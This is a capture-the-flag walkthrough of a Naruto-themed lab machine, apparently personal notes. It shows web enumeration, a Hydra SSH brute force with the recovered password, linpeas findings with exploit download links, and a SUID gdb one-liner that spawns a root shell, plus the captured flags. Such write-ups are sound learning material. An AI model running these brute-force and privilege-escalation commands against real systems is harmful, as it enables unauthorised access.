Apache/2.4.38

Apache httpd 2.4.38

Apache 2.4.17 < 2.4.38 - 'apache2ctl graceful' 'logrotate' Local Privilege Escalation 

```php
searchsploit Apache 2.4.38
```

/Cryoserver -> blank
- I try httpie on the dir to see if anything else comes up, and it does:
- Taking a look again at the server, the page needed to be scrolled down, and that's why i didn't see it at first.

```php
http -v GET http://192.168.207.142/Cryoserver
```

/Temari -> looks the same as kaz
/Kazekage -> looks like the same document, but this time it's grammar is better
/iamGaara -> text desc of gaara

Looking in burp compare it shows that just a few things are added, the links to the sources[1] and:
- Appearances
- In Naruto
I find the entry finally that compare said was added: ==f1MgN9mTf9SNbzRygcU==

![[Pasted image 20240913133637.png]]

gaara:ismyname

![[Pasted image 20240913134258.png]]



The login doesn't work. This is proving to be tricky for an easy box. This did seem to prove that gaara does exist on the machine though, so not all bad.

I'll try brute-force the login. 

```php
hydra -l gaara -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

![[Pasted image 20240913135331.png]]

host: 192.168.207.142   
login: gaara   
password: iloveyou2

I logins and find the first flag in the home dir.

`a823c7c712d74707b9a10294add920f8`

Now i'll take a quick look around and then transfer ps.py and linpeas.

Linpeas output:

```php
[+] [CVE-2019-13272] PTRACE_TRACEME                                                                                              
Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
Exposure: highly probable
Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},[ debian=10{kernel:4.19.0-*} ],fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.
```

```php
 https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-path-abuses                                          
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```
- /usr/local/games

```php
╔══════════╣ Checking sudo tokens
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#reusing-sudo-tokens                                           
ptrace protection is disabled (0), so sudo tokens could be abused         gdb was found in PATH
```

SUID: /usr/bin/gdb

I look up bdg on `gtfobins` and it gives me a one liner which i try and get root.

```php
./gdb -nx -ex 'python import os; os.execl("/bin/sh", "sh", "-p")' -ex quit
```


![[Pasted image 20240913141503.png]]

Flag:
aa7839494994e109d2e43c6913874a26

![[Pasted image 20240913141643.png]]

---

**Completed:** _14:19 2024-09-13_

